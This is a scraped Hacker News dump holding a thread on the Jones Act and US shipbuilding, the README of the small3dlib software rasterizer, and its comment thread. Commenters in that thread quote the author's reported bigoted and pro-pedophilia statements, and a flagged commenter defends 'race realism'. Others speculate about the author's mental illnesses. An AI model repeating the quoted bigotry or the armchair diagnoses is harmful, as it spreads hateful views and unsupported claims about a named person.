regardless of the financial circumstances. Investment can (and often is) different from protectionism. Typically, investment provides time-limited grants or other forms of support. If a company misuses them, a global (or local) competitor will outpace it. Protectionism ensures that companies are indefinitely protected from global competition, so they don't feel as pressed to improve. reply toomuchtodo 19 hours agorootparentThe developed world is unable to compete on a level playing field against other countries when taking into consideration potentially enormous subsidies or developing world labor costs. Protectionism, when implemented strategically, can reduce these counterparty advantages. Investment is also a component, but they both work in concert to arrive at a desired outcome. And I think that’s really where this problem lies, that we’re arguing about protectionism versus investment, when we should be identifying what the desired outcome is and then, based on an inventory of all of the policy and capital allocation tools that we have available to us, implement what is needed to arrive at the desired outcome. We don’t want to sacrifice innovation (which calls for mechanisms to prevent companies from leaning too far towards entrenched interests vs innovators), but we also don’t want to run a race we cannot win because we unnecessarily handicap ourselves in an inherently unfair and unequal global market. I am not a terribly smart person, and I don’t have all the answers, but I would argue it’s clear what we’ve done so far isn’t working, based on all available evidence. reply cyberax 16 hours agorootparent> The developed world is unable to compete on a level playing field against other countries when taking into consideration potentially enormous subsidies or developing world labor costs. Cheap labor cost typically is only a fraction of a high-tech product. If anything, China was not the world's biggest factory, but the world's biggest assembler. It's changing right now, and China is producing more of its own high-tech components. So a small amount of protectionism (like a 10-15% tariff) might be OK, and it will compensate for this labor cost discrepancy. But not tariffs that simply make the local industry complacent. reply nostrademons 20 hours agorootparentprevMusic, movies, microcode, and high-speed pizza delivery. reply shiroiushi 15 hours agorootparentMusic? I don't think anyone listens to American music these days outside of America (and maybe Canada). America used to produce great music, back in the 60s-80s, that people around the world wanted to listen to, but that went away after the 2000s. American movies, however, are still quite popular abroad. Offhand, I'd say it's one of America's biggest exports. \"Microcode\" is the other one, if you mean things like CPU design: all the biggest CPU makers are in America: Intel, AMD, Apple, Qualcomm, etc. (Many of the CPUs are manufactured elsewhere, usually by TSMC, but all the design work is done in the US.) reply TrickyRick 15 hours agorootparentThere's this Taylor girl who seems pretty popular but maybe you're right, the record concert sales probably implies nobody is listening to her. reply shiroiushi 14 hours agorootparentAccording to this article (https://www.billboard.com/business/touring/taylor-swift-eras...), it looks like it's mainly American tourists going to Europe to see Swift's shows because the ticket prices are 1/10 as much as in America. Apparently, it costs about $5000 for a couple to see a Swift show in the US now, so it's actually a lot cheaper to just fly to Europe to see her show. reply daveguy 13 hours agorootparent> $5000 for a couple to see a Swift show in the US now... That's just not true. As long as you are able to get an original ticket and not a resold one. But ticketmaster and live nation should be regulated because they're a middleman monopoly in all of it. reply shiroiushi 12 hours agorootparent>That's just not true. According to the 1st paragraph of the linked article, it is. >As long as you are able to get an original ticket and not a resold one. That's pretty useless if they all get bought up by resellers. reply foota 21 hours agorootparentprevService industries. reply toomuchtodo 21 hours agorootparentWhich are non critical and can be shed without much harm. Critical industries are, by definition, critical and require sacrificing efficiency to preserve. If you want to be able to build and retain the capability, you have to protect the machine that does the building: people, institutional knowledge and domain expertise, equipment, etc. Otherwise, you forget how to build, the machine evaporates. And here we are. reply kortilla 21 hours agorootparentprevThat’s because a huge portion of the service industry requires local people. reply vkou 21 hours agorootparentprevIts kind of difficult for a hairdresser in Turkey to compete with the barber down the street from my house. reply Mistletoe 21 hours agorootparentprevIf we measured our service industries the same way we measure boats, we would rapidly see they can’t float either. reply theropost 21 hours agorootparentprevYeah, it's a tough pill to swallow but honestly, the workforce as a whole is kinda coddled at this point. Most people don’t even realize they're being paid more than what they're actually worth. Like, we’re not really creating enough value or building enough stuff that justifies what we think we should be getting. The only reason our value holds up right now is probably cuz of the defense industry flexing its muscle to keep things stable. But let’s be real, as other countries rise up and we start losing our grip as the top dog, we're gonna feel the pain. It could be a slow burn or maybe a faster crash, but either way, it's gonna suck. We’re gonna have to go through some serious hardship to get back to where we think we should be. Not based on what we think we deserve, but what we actually do. And it’s kinda mixed messaging too, right? We somehow believe our labor is more valuable than others, but at the end of the day, it’s gonna come down to working harder. Longer hours, more back-breaking labor, real work, not just sitting in an office chair all day. We’re not entitled to cushy jobs forever, and things are gonna get a lot harder before they get better. reply ViewTrick1002 21 hours agoparentprevIt all stems from the Jones act. [1] The American shipbuilding industry has been allowed to atrophy in an idea that protectionism would lead to good commercial the results. What little gets built in the US is way behind the global peers in terms of economics and quality. As usual the end results are that the entire shipping industry works around the Jones act, for example cruise ships from Florida docking in the Bahamas, and for the regions that can’t do it they are tough out of luck. Why can’t the US build offshore wind? Because there are no jones act compliant vessels and the proposed workaround is staging all the materials in Canada and adding an enormous time waste to the projects. [1]: https://en.m.wikipedia.org/wiki/Merchant_Marine_Act_of_1920 reply stackskipton 21 hours agorootparentCongress has been pushed not to eliminate would completely wipe out tiny remaining American Merchant Marine fleet. Most people who want to get rid of Jones Act are economists and other types who sole concern is \"How much more money can we make from cheap shipping\" while ignoring any national security concerns. We could talk about modify it maybe allowing purchase of specialized ships from overseas friendly countries, like icebreakers from Finland. reply ViewTrick1002 21 hours agorootparentThat is the problem with protectionism. What starts with good intentions ends with a bandaid that someday will have to be ripped off at the cost of the people who made a subsidized living based on it. reply stackskipton 21 hours agorootparentExcept if you can't move stuff around without support of 3rd party nations, that's defense crippling. If you want to be a global power, you require great navy, both civilian and military. That's been true since 1500s and will likely remain true for many years to come. So question is, do we throw out Jones Act and slowly stop being World Superpower or leave it and pay higher upfront costs in certain places? That's political answer obviously. reply xyzzyz 21 hours agorootparentWhat you’re missing is that our ability to move stuff around has already deteriorated to almost nil, precisely due to Jones Act and shipbuilding workforce unionization. We already cannot build vessels we need at quantities we need. This is already reality today. Repealing Jones Act cannot make our situation much worse. It can, however, make us much better off, by for example allowing US companies to buy foreign ships to do tasks that currently are covered by Jones Act, and as a result are not done at all. For example, we’d be able to ship gas from American oil fields in the South to consumers in the North, where there missing or insufficient pipeline capacity. Right now, Jones Act forces US consumers in the North to buy foreign gas. Couple years back, before the Russia-Ukraine war, Russian Gazprom was making nice profit on the following run: 1) sail to Northeastern US, sell it Russian LNG 2) sail to Gulf of Mexico to buy American LNG for cheaper than it sold Russian gas to Americans in the North 3) sail elsewhere in the world to sell them American gas, eg to Europe or Africa. This was only possible because Jones Act makes it impossible to ship LNG from Southern US to North. There are literally no vessels that can do it. It already cripples our ability to move things around. reply stackskipton 20 hours agorootparentI think there could be some discussion of modify the Jones Act to allow non US made ships to be use in Merchant Fleet. However, key provision of Jones Act around only US flagged ships may transport two US ports. If you eliminate that, forget it, US Merchant Marine fleet will go poof. Since it's a global industry, workers from other countries are obviously much cheaper than any US salaries. reply 45HCPW 7 hours agorootparentThe US merchant fleet has already gone poof. According to Wikipedia \"As of 31 December 2016, the United States merchant fleet had 175 privately owned, oceangoing, self-propelled vessels of 1,000 gross register tons and above that carry cargo from port to port. \" The list is likely even shorter today. reply stackskipton 4 hours agorootparentJones Act is what is keeping that tiny fleet alive on life support. It would likely approach ZERO outside the Great Lakes without the act. Jones Act is not what killed the US Merchant Marine Fleet. Globalization is what killed it. reply ccozan 20 hours agorootparentprevSorry to ask, are not any gas pipelines in US? In Europa there is a huge network of pipelines moving gas around in any direction. reply stackskipton 20 hours agorootparentThere is but there isn't enough capacity in particular over the Rockies. So LNG ships are needed to help move what pipelines can't. reply ViewTrick1002 21 hours agorootparentprevThe problem is that the US fleet is minuscule. The entire US Jones act compliant fleet comprises 60 vessels. It is not a great civilian navy. https://www.maritime.dot.gov/sites/marad.dot.gov/files/2021-... reply ElevenLathe 21 hours agorootparentprevI think the argument among the anti-Jones contingent is that our only real hope of having a globally competitive shipbuilding industry is to repeal it and all the other things preventing our shipyards and merchant marine from having incentive to compete globally. As it is, there is a slow trickle of work for domestic shipyards that is based solely on policy (ships that legally HAVE to be US-made, whether for Jones Act reasons or military reasons). Without that protectionism, they would have to build ships at a quality, price, and timetable that is competitive with the rest of the world. I'm not super sympathetic to arguments that presuppose the absolute requirement that US hegemony continue indefinitely, but certainly if you are trying to make sure your shipbuilders will be roughly as good as foreign ones or better (a reasonable policy goal, even leaving out military reasoning), cutting them off from competition with those foreign shipyards is not going to result in what you want. If there is a ready market for expensive, poor quality ships that take years longer to build than they do abroad, why would I as a shipbuilding executive invest to improve on any of those metrics? It would be wasted money, because my existing capital and workforce are already 100% utilized in high-margin activities, with orders stretching out years into the future. reply vkou 21 hours agorootparentMore realistically without the Jones act, ships wouldn't be built or operated by the US at all. International vendors can do this cheaper. You'd instead see all domestic shipping be entirely dependant on third-party international operators paying third-world wages to third-world crews, and you'd have next to zero recourse against them if they, say, run one of their ships into a bridge, or spill a few million litres of oil. reply xyzzyz 21 hours agorootparentThey already are not built in the US at all. This is already true today. We already build less than one oceangoing Jones Act compliant ship a year. The US shipbuilding industry can hardly get any worse than it already is today. reply vkou 20 hours agorootparentMy point is that it wouldn't get any better. Anyone blaming the Jones Act for this completely misidentified the root cause. There are a few good reasons to repeal the Jones Act (reduce shipping and trade costs in Hawaii, Alaska, and Puerto Rico) and a lot of really bad ones (the domestic shipping industry will be completely killed, and you're inviting unbounded liability from unregulated, fly-by-night international actors who don't give two craps about our laws.) The way ocean shipping currently works is entirely incompatible with any national rule of law. Flags of convenience and corporations with non-existent liability mean that nobody in the international industry is actually following any of the rules. The domestic industry has to follow them, which is the reason why it's not cost competitive. reply ViewTrick1002 20 hours agorootparentI think you have a cursory understanding and are then pulling that to the extreme without actually knowing how the industry operates. The problem stemming from flags of convenience is well known and the Port State Control system [1] was created to manage it. In other words: live up to our requirements or we will detain your vessel. The US is not a signatory to any international port state control scheme but as is usual the US runs its own nearly equivalent scheme through the coast guard. [2] [1]: https://en.wikipedia.org/wiki/Port_state_control [2]: https://www.dco.uscg.mil/Our-Organization/Assistant-Commanda... reply vkou 18 hours agorootparentIn practice, these inspections are insufficient, and the liability problem remains (which can vastly exceed the value of the ship). The problem is that there is too much to check, too many incentives and reasons to break the rules, and too few consequences for people who do. reply wongarsu 21 hours agorootparentprevYou are saying that as if sacrificing a tiny industry to benefit the entire rest of the economy is somehow a bad thing. And the merchant marine isn't really big enough to contribute much to a hypothetical war either. Of course there have to be considerations to maintain the capability to build warships. But other than that the Jones Act seems to do a lot of damage for very little benefit. Though ripping off the bandaid would be painful in that moment reply gottorf 21 hours agorootparentpr",
    "originSummary": [
      "The U.S. has only two operational icebreakers, the Polar Star and Healy, and hasn't built a new heavy icebreaker since 1976, despite significant interests in polar regions.",
      "The Polar Security Cutter program, initiated in 2013 to build new icebreakers, faces delays and cost overruns, with the first ship now expected by 2029 at a cost of $1.7-1.9 billion per ship.",
      "U.S. shipyards lack experience in building icebreakers, and protectionist laws requiring domestic construction hinder the potential for more efficient and cost-effective foreign-built ships."
    ],
    "commentSummary": [
      "The U.S. faces challenges in building icebreaking ships due to uncompetitive shipbuilders and potentially overly ambitious government requirements.",
      "High costs and low production rates have left the U.S. shipbuilding industry struggling, similar to Canada, which also lacks recent experience in building specialized icebreakers.",
      "Collaborating with countries like Finland, which have expertise in icebreaker construction, could help, but protectionist laws like the Jones Act complicate purchasing foreign-built ships."
    ],
    "points": 218,
    "commentCount": 285,
    "retryCount": 0,
    "time": 1727381879
  },
  {
    "id": 41665569,
    "title": "Small3dlib: Public domain 3D software rasterizer",
    "originLink": "https://codeberg.org/drummyfish/small3dlib",
    "originBody": "Explore About FAQ Donate Help Register Sign In drummyfish/small3dlib Watch 4 Star 36 Fork You've already forked small3dlib 2 Code Issues5 Projects Releases Wiki Activity Suckless PD 3D software rasterizer 433 commits 1 branch 0 tags 14 MiB C 99.2% C++ 0.5% Python 0.3% master Find a file HTTPS Download ZIP Download TAR.GZ Download BUNDLE Open with VS Code Open with VSCodium Open with Intellij IDEA Cite this repository BibTeX Cancel Miloslav Ciz c986e9b025 Update readme media Fix filenameprograms Add hotfix of a bugtools Add comment to scriptDoxyfile Simplify DoxyfileLICENSE.txt Make license even more clearREADME.md Update readmesmall3dlib.h Add ortho projectionTODO.txt Add ortho projectiontodo.txt Update todo.txtREADME.md small3dlib Public domain 3D software rasterizer for (not only) resource-limited computers. If you like this, you may also like my similar project: raycastlib. These two libraries can very easily be combined together -- here is a proof-of-concept gif (environment rendered with raycastlib, cubes with small3dlib): eye-candy previews Pokitto (32bit embedded console, 48 MHz, 36 kB RAM): Gamebuino META (Arduino 32bit console, 48 MHz, 32 kB RAM): PC (SDL, offline rendering, terminal): features Very fast, small and efficient, runs even on tiny bare metal embedded with just megahertz CPUs and kilobytes of RAM. Uses only 32bit integer math, NO float, with a compile time option to use wider types if needed. No dependencies (uses only stdint standard library, NO stdio), extremely portable. Single header, KISS, suckless. No OOP, no design patterns, just nicely documented functions. No dynamic heap allocation. Pure C99, tested to run as C++ as well. Still flexible -- pixels are left for you to draw in any way you want with a custom fragment-shader like function. Perspective correction, 3 modes: none (linear only), full (per-pixel), approximation (per-N-pixels). Different drawing strategies to choose from: none, z-buffer (none, full, reduced), triangle sorting (back-to-front, fron-to-back with stencil buffer). Triangles provide barycentric coordinates, thanks to which practically anything that can be achieved with OpenGL can be achieved (texturing, shading, normal-mapping, texture fitering, transparency, PBR, shadow mapping, MIP mapping, ...). Different near plane coliision handling strategies, several options: cull, push, geometrically correct clip, geometrically and barycentric correct clip. Choose the one that best suits you program. Top-left rasterization rule, pixels of adjacent triangles don't overlap or have holes (just like in OpenGL). Tested on many platforms: PC (little endian, 64bit GNU) PowerPC emulator (big endian) compilers: gcc, clang Arduboy (only experimental) Pokitto (32 bit resource-limited, ~80 MHz CPU, 32 kB RAM) Gamebuino META (32bit resource-limited embedded ARM) ESPboy (embedded open console, demos ported by RomanS) TODO: Android Windows emscripten (web browser, JavaScript transpile) Extremely portable due to no dependencies, no float, no build systems, low HW requirements, endian independence etc. Many compile-time options to tune the performance vs quality. Similar to OpenGL in principle, but simpler, easier to use, with higher-level features. Perspective and orthographic projections. Tools (Python scripts) for converting 3D models and textures to C array format used by the library. Well commented and formatted code. Automatic documentation (comments + provided Doxyfile). Completely free of legal restrictions, public domain, do literally anything you want. NOTE: Backwards compatibility isn't a goal of this libraray. It is meant to be an as-is set of tools that the users is welcome to adjust for his specific project. So new features will be preferred to keeping the same interface. why? You just need to make a small mini 3D game, quick 3D animation or visualization and don't want to go through the horror of learning and setting up OpenGL or Vulkan, installing drivers, learning complex APIs and libraries? Don't want to be tied to HW, 3rd party API or libraries and their dependencies? Don't want to install gigabytes of heavy super ultra graphics engines just to play around with a few low poly models? You need a simple software renderer as a fallback to your main renderer? You want to create extremely portable 3D graphics that will run on small obscure embedded platforms that don't have OpenGL, good specs, FPU unit or even standard C library? Want to just render something offline simply without caring about highest rendering speed? You want to toy around with modifying something in the rendering pipeline that you can't easily do or debug in big frameworks (such as the rasterization algorithm)? Want to hack around in the demo scene? Want to create something public domain and need a public domain renderer? Or just don't want to be bothered by conditions such as proper attribution or copyleft? You want to create an authentic retro wobbly PS1 style graphics? Then this library may help you. limitations And advantages at the same time :) No scenegraph (object parenting), just a scene list. Parenting can still be achieved by using cutom transform matrices. Though performance is high, due to multiplatformness it probably can't match platform-specific rasterizers written in assembly. There is no far plane. There is no subpixel accuracy (PS1 style graphics). There is no antialiasing, but you can still achieve it by supersampling (render in higher resolution and downscale) or filters like FXAA. At the moment there is no wireframe rendering, but you can simulate it easily (see model viewer example), or write it by hand (drawing lines is not that hard). Due to the limitations of using only integer arithmetics, some types of movement (particularly camera) may look jerky, and artifact may appear in specific situations. This can partially be fixed with S3L_USE_WIDER_TYPES. There's no extensive error and memory safety checking, you're supposed to not try to crash the library. There are no built in-shaders, I/O, LOD, mipmaps, texture filtering, collision detection, sprite drawing, terrain, bone animation, font drawing, postprocessing, v-sync, sound and other things you might find in the \"big\" engines. This is only a simple 3D rasterization library, you're supposed to implement the above mentioned things yourself (or use other libraries), however it's not that hard and it's usually the fun step. Check out the examples to see how it's done. how to use For start take a look at the helloWorld.c program, then terminalCube and then other examples (e.g. level.c shows simple integration with SDL). For more see the other examples and the library code itself, it is meant to be self-documenting, i.e. the source code IS the documentation -- you'll find the description of a lot of things at the start of the file. You can also use doxygen to generate an HTML documentation. The basic philosophy is: The library implements only a rendering back-end, it doesn't perform any drawing to the actual screen itself, hence there is no dependency on any library such as OpenGL or SDL. It just calls your front-end function and tells you which pixels you should write. How you do it is up to you, you can use whatever library that can draw pixels to the screen to do it (SDL, SFML, X11, QT, ncurses, ...). Before including the header, define S3L_PIXEL_FUNCTION to the name of a function you will use to draw pixels. It is basically a fragment/pixel shader function that the library will call. You will be passed info about the pixel and can decide what to do with it, so you can process it, discard it, or simply write it to the screen. Also init screen resolution, either by defining S3L_RESOLUTION_X and S3L_RESOLUTION_Y (before including the library) or by setting S3L_resolutionX and S3L_resolutionY variables. Use the provided Python tools to convert your models and textures to C arrays, include them in your program and set up the scene struct. Init the 3D models and the scene with provided init functions (S3L_init*), set the position of the camera. Call S3L_newFrame to prepare for rendering, then call S3L_drawScene on the scene to perform the frame rendering. This will cause the library to start rendering and calling the S3L_PIXEL_FUNCTION in order to draw the frame. You can of course modify the function or write a similar one of your own using the more low-level functions which are also provided. Fixed point arithmetics is used as a principle, but there is no abstraction above it, everything is simply an integer (S3L_Unit type). The space is considered to be a uniform dense grid of discrete points, and what would normally be a 1.0 float value is an int value equal to S3L_FRACTIONS_PER_UNIT units (aka S3L_F). Numbers are normalized by this constant, so e.g. the sin function returns a value from -S3L_FRACTIONS_PER_UNIT to S3L_FRACTIONS_PER_UNIT. You have to pass numbers of this format to the library functions, but of course you may chooe to use floats in other places of your program. tips/troubleshooting Don't forget to compile with -O3! This drastically improves performance. Your pixel drawing function (S3L_PIXEL_FUNCTION) will mostly be the performance bottleneck, try to make it as fast as possible. The number of pixels is usually much higher than the number of triangles or vertices processed, so you should focus on pixels the most. In your S3L_PIXEL_FUNCTION use a per-triangle cache! This saves a lot of CPU time. Basically make sure you don't compute per-triangle values per-pixel, but only once, with the first pixel of the triangle. You can do this by remembering the last triangleID and only recompute the value when the ID changes. See the examples for how this is done. Some things, such as screen resolution, can be specified as static (compile time, can't change during run time) or dynamic. If you can, prefer setting them to static and a power of two (e.g. #define S3L_RESOLUTION_X 512) to increase performance! Seeing buggy triangles flashing in front of the camera? With the limited 32bit arithmetic far-away things may be overflowing. Defining S3L_USE_WIDER_TYPES to 1 will likely help. Besides this you can try to scale down the scene. If you also don't mind it, set S3L_STRICT_NEAR_CULLING to 1. With a bit of work you can implement big scene rendering even without wider types by multipass rendering (first render the far away scene scaled down, then clear z-buffer and render the near part of the scene over it). Seeing triangles weirdly deform in front of the camera? See S3L_STRICT_NEAR_CULLING == 0, you may set it to correctly handle near plane culling for a cost of some performance, or you may try different things like subdividing your model to more triangles which may reduce the negative effect. Seeing triangles disappear randomly in sorted modes? This is because the size of the memory for triangle sorting is limited by default -- increase S3L_MAX_TRIANGLES_DRAWN. Sorted mode sorts triangles before drawing, but sometimes you need to control the drawing order more precisely. This can be done by reordering the objects in the scene list or rendering the scene multiple times without clearing the screen. license Everything in this repository is CC0 1.0 (public domain, https://creativecommons.org/publicdomain/zero/1.0/) + a waiver of all other IP rights (including patents and trademarks). I've written the code completely myself, from scratch. The art used in demos is either my own released under CC0 or someone else's released under CC0. This project is made out of love and to be truly helpful to everyone, not for any self interest. I want it to forever stay completely in the public domain, not owned by anyone. This is not mandatory but please consider supporting free software and free culture by using free licenses and/or waivers. If you'd like to support me or just read something about me and my projects, visit my site: www.tastyfish.cz. You can also choose to use this under the following waiver which is here to just ensure more legal safety and waiving of additional IP such as patents: The intent of this waiver is to ensure that this work will never be encumbered by any exclusive intellectual property rights and will always be in the public domain world-wide, i.e. not putting any restrictions on its use. Each contributor to this work agrees that they waive any exclusive rights, including but not limited to copyright, patents, trademark, trade dress, industrial design, plant varieties and trade secrets, to any and all ideas, concepts, processes, discoveries, improvements and inventions conceived, discovered, made, designed, researched or developed by the contributor either solely or jointly with others, which relate to this work or result from this work. Should any waiver of such right be judged legally invalid or ineffective under applicable law, the contributor hereby grants to each affected person a royalty-free, non transferable, non sublicensable, non exclusive, irrevocable and unconditional license to this right. Codeberg Documentation Community Issues Contributing Report Abuse Association Who are we? Bylaws / Satzung Donate Join / Support Contact Service Codeberg Pages Weblate Translations Woodpecker CI Forgejo API Status Page Legal Imprint / Impressum Privacy Policy Licenses Terms of Use BlogMastodonMatrix Space English Bahasa Indonesia Deutsch English Español Esperanto Filipino Français Italiano Latviešu Magyar nyelv Nederlands Polski Português de Portugal Português do Brasil Slovenščina Suomi Svenska Türkçe Čeština Ελληνικά Български Русский Українська فارسی 日本語 简体中文 繁體中文(台灣) 繁體中文(香港) 한국어",
    "commentLink": "https://news.ycombinator.com/item?id=41665569",
    "commentBody": "Small3dlib: Public domain 3D software rasterizer (codeberg.org)212 points by flykespice 16 hours agohidepastfavorite96 comments gregschlom 14 hours agoThe other repos from this person are also worth checking: https://codeberg.org/drummyfish E.g.: https://codeberg.org/drummyfish/Anarch reply biggestfan 13 hours agoparentAlso worth nothing that this person is an open pedophilia advocate and \"race realist\" as can be seen on their homepage https://www.tastyfish.cz/ Can't speak for the quality of the software but important to note. reply LeoPanthera 13 hours agorootparentI was about to flag this comment but... yikes. You're right. Super awkward. \"I immediately turn off any documentary where a woman starts talking as a \"scientist\".\" - what the hell. reply tecleandor 10 hours agorootparent> I no longer use 4chan (in fact I'm banned) Well. That says something. reply kleiba 10 hours agorootparentprev\"Some things I like: [...] - *n-word* - objectifying women - weak women - stalking\" reply smusamashah 1 hour agorootparentCould that page be all sarcasm? Is this person head to toe drowned deep in sarcasm and living a sarcastic life? reply dijksterhuis 10 hours agorootparentprev> Things I dislike: https://xkcd.com/1357/ Yeah, I guess it makes sense they wouldn’t like that one. reply jandrese 13 hours agorootparentprevWow, this harkens back to the dark corners of the old Internet, where people posted whatever they felt like because nobody was ever going to find it. I'm not sure which one it is, but this guy is definitely on a spectrum. The likes and dislikes section is quite a trip. reply kstrauser 13 hours agorootparentprev“What, they have to be exaggerating.” 2 minutes later, I noped out of there. I want nothing to do with this person. reply EnigmaFlare 8 hours agorootparentnext [3 more] [flagged] timkq 7 hours agorootparent^^I think we found this guy's account This isn't at all kindness. This guy's perception of kindness (and love, etc.) is extremely flawed. He doesn't have to worry about other people because he is mentally ill. I'd have to read up on it more to figure out the exact kind, but this seems something in the region of BPD or schizophrenia. It's very possible that it's multiple diagnoses. reply EnigmaFlare 6 hours agorootparentnext [2 more] [flagged] timkq 6 hours agorootparentHow is the hypothetical person's nationality in any way relevant? Oh, yes, it's relevant, because the Western society hates racists, so if he is something the society doesn't want, then he must be mentally ill! No. This guy is actually mentally ill. If I were a betting man, I'd wager that it's some kind of BPD and I think a psychologist could analyze this better than me, a layman. reply Culonavirus 13 hours agorootparentprev> open pedophilia advocate and \"race realist\" Damn, what a combo... if HN had default link colors, I'd say that one stays blue reply EnigmaFlare 8 hours agorootparentnext [6 more] [flagged] zenburnmyface 8 hours agorootparentyou're really showing your hand here... reply EnigmaFlare 7 hours agorootparentnext [3 more] [flagged] anthk 6 hours agorootparent>ethnic differences Show me the differences between a French Basque and a Spaniard Basque. The first one it's called a French White and the other, Hispanic. Yet they are virtually the same. Then, the differences between a Catalan and some French Occitan. Or some Galician and a Northern Portuguese. reply anthk 5 hours agorootparentprevWait until you find most ethnics are just remixes of each other since forever. Specially, the Roman Empire and the Mediterranean. It grew up thanks to three simple things: - The same law for everyone no matter the race or ethnics. - Sharing knowledge and goods. And genes. Inbreeding: retardation and diseases. - Adopting the good things universally, discarding the rest. The Golden Rule works. Math works. Science worked everywhere. Just look at Unix. Stagnation and minimalism made it to evolve into Plan9/9front adopting traits from other OSes. Namespaces. Acme looking like Overon. Even GNU mainly enhanced Unix from ITS with GNU/Emacs to crazy levels. Does the guy from that atrocious linked site (not tastyfish) use Emacs under ITS instead of GNU on top of Unix? No? Then he might be the greatest hypocrite ever. Because RMS at least tried to bring the ITS hackability to the masses with pragmatical reasons under a libre reinvented Unix called GNU. These purists don't realize that no system nor human has been pure, ever, save for very primitive inbreed humans and technologies. Yeah, go, White Power. What where the WASP guys doing at the Roman times? Living in huts. What did the multi-ethnics spawning olive/white colored Roman and Greek doing in the meanwhile? Shaping up the Western Civilization. On tech, did RMS kept using PDP10's and ITS/Maclisp with Emacs? No, he adapted and it carried on Unix' legacy by writting something technically superior with namespaces (Hurd), empowering the user and Emacs on top providing a great shell (even with Eshell) compared to the previous one. Meanwhile, a pure Unix would leave us with bc/dc and a simple AWK plotting tool with C which is not as portable as you think, even with TCC and C99. Heck, even Unix v10 and Plan9/9front don't look like your typical Unix at all. You have sam, not ed/vi. It shows up that using the mouse it's sometimes fine, it killed the VT, albeit using a keyboard helps with the RSI too. That's why Emacs provides the two interfaces greatly working in parallel. Can you use Emacs under X with just a keyboard? Perfectly well. reply stirfish 7 hours agorootparentprevTo be clear: the two ideas are pedophilia and racism? You're saying there's no valid arguments against pedophila and racism? reply EnigmaFlare 7 hours agorootparentnext [2 more] [flagged] stirfish 6 hours agorootparent\"Race realism\" is pseudoscientific racism. Racism in a cheap suit. I bet if you sat down and thought about it, you could come up with some valid arguments against both of those things. reply WesolyKubeczek 5 hours agorootparentprevAlso self-professed extreme left. I suspected they would turn out like this, now I have a proof. reply ixtli 3 hours agorootparentFor anyone curious, the name for this is \"nut picking\" ! :) reply WesolyKubeczek 2 hours agorootparentNow if rule 34 doesn’t apply here, I’ll be damned reply dartos 10 hours agorootparentprevA lot of crazy stuff on there, but Privacy is censorship threw me for a loop. I haven’t heard that one before reply rollulus 8 hours agorootparentprev> important to note Why is that important? The guy surely has controversial opinions but you’re not supporting them by importing his rasteriser, is it? reply wkat4242 7 hours agorootparentIt's the association. Things vary in value to us depending the brand it portrays. This is why people pay $150 for Nike shoes despite them being made by the same kids in the same sweatshop as the $10 Primark runners. It's also why initiatives like ReiserFS died after its creator turned out to be a murderer. As humans we're always looking for things that align with our values and \"tribe\". Maybe it shouldn't be that way and we should judge each product purely on its merits but for most of us it's just how we are. reply graemep 5 hours agorootparentPeople never seem to apply this to the arts. People still use Eric Gill's fonts (sexually abused his kids), they put on plays by Oscar Wilde (who was definitely a sex tourist and the descriptions in letters makes it fairly clear the boys were underage), several murderers are admired for their works: https://www.bbc.com/culture/article/20170517-can-you-separat... I would not want to work with this guy, but using his code is not the same. I suspect if ReiserFs had been more successful it would have been forked rather than died after the murder conviction. THis guy also sounds like he has severe mental health problems or is trolling: \"I am physically the most disgusting form of existence that ever lived, I am so ugly people vomit when they merely see me. I can't even buy a prostitute no matter how much I would pay.\" reply astrobe_ 6 hours agorootparentprevReading a bit their LRS wiki made me think that it's another case of a perhaps very good programmer but with some kind of mental disorder, which certainly modify how I would approach their software (trustworthiness, long term evolution and support...). reply timkq 6 hours agorootparentNot only that, but also hating on memory safety (for no reason at all) is just dumb. Most of his software is just simple projects, except maybe this, it's definitely not something I'd use in my day to day life. My opinion on him is the same as my opinion on Terry Davis (if he would contribute to Linux (or other FOSS projects, instead of making his own useless TempleOS), he would leave a way better legacy) reply diggan 5 hours agorootparent> hating on memory safety (for no reason at all) is just dumb (and another sign of his mental illness). Hah, this has to be peak HN, hating on memory safety is now a mental illness :) What's next, not liking static typing means you suffer from mental illness too? reply timkq 4 hours agorootparentI agree with your sentiment - and I apologize, I've since revised my comment. Hating on memory safety as a concept is pretty cognitively dissonant for a programmer (and in this case [& many others], cognitive dissonance is a sign of some underlying mental illness). Memory safety is something a programmer should strive to achieve 100%. Not only that, but static typing is absolutely unrelated to memory safety. (How can you even compare these two concepts???) reply Aardwolf 4 hours agorootparentDepends on the use case, while you care about it when writing software for use on modern systems, low level programming on something where you can have unrestricted access to, for example, all of its 1024 bytes of address space at once can be fun too But of course appreciating this doesn't equal \"hating memory safety\" reply timkq 4 hours agorootparentI agree with you. He's conflating memory safety with languages that provide memory safety (by which I think he means Rust, as that's another thing listed in his \"disliked\" things list) - that's what I feel is the dumbest about this. For me, this seems like the most of his code is riddled with use-after-free, double-free, not freeing etc. bugs. He may be intelligent, but if his intelligence goes to no use (besides making random C side projects..), it is not worth it. Also he claims he was a member of Mensa, no comment on that one. reply arnon 7 hours agorootparentprevNazism and pedophilia are controversial??? reply aniviacat 7 hours agorootparentNot all racists are nazis. reply keerthiko 10 hours agorootparentprevwoah the guy was banned on 4chan is there a hall of fame for \"fires too hot for hell\"? reply danielEM 9 hours agorootparentprevLooks like that guy got lost a little in his life, I'm asking myself if he can be helped somehow? And if so then how? reply rollcat 9 hours agorootparentOn an individual level - no, I don't think so, at least not easily. One can't be helped if they don't want to, or don't see a reason why they would need help. Successful therapy is 99% your own work, a therapist will help you find the door but it's you who must take the step. On social level, we need to call out this sort of viewpoint/behaviour, and make it clear it's beyond unacceptable. Then it's up to the individual to decide if they want to reintegrate with society (which would be predicated on seeking help). reply daghamm 8 hours agorootparentThis is what I have learned after working with some really crazy people: 1. Show them some love, even if they don't deserve it 2. Don't be combative or argumentative. If the guy believes earth is flat, don't try to change his mind. But be open on where you stand and don't try to pretend sharing some of his views just to please him. May not work on everyone and some folks are just evil, but I think many crazy dudes out there are just alone and have really bad social skills. reply aniviacat 7 hours agorootparentprev> One can't be helped if they don't want to, or don't see a reason why they would need help. It appears to me he does see a reason why he'd need help. Some statements from his site: > I am quite lonely > I am physically the most disgusting form of existence that ever lived, I am so ugly people vomit when they merely see me. > I am impossible to be loved romantically > I am largely scared of falling in love. He appears to have significant social and self-esteem issues. He recognizes that. I assume the lonelyness he has to deal with is the core reason for why he developed such extreme views. Since he recognizes these issues it appears to be quite realistic for him to learn to normally engage with society again. I think he can be helped. Now, as to how someone who's cut off from society and doesn't posess basic social skills can learn to socialize again, I don't know. Therapy perhaps, but that's a difficult step to take. reply forgotoldacc 9 hours agorootparentprev> but important to note. Not sure why. Terry Davis made incredible software and his disability made it more exceptional. Being a weirdo doesn't make code better or worse. I wouldn't want my kids going to a school run by this person, but who cares 